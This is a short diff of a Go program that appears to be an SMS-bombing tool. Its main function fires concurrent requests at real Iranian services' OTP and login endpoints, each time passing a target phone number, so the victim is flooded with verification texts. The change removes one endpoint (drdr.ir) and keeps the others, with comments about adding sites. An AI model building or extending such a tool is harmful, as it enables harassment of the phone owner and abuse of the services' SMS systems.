@@ -270,9 +270,6 @@ func main() {
 		go sms("https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
-		go sms("https://drdr.ir/api/registerEnrollment/verifyMobile", map[string]interface{}{
-			"phoneNumber": phone,
-		}, ch) // dar khate 228 neveshteh shodeh.
 		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
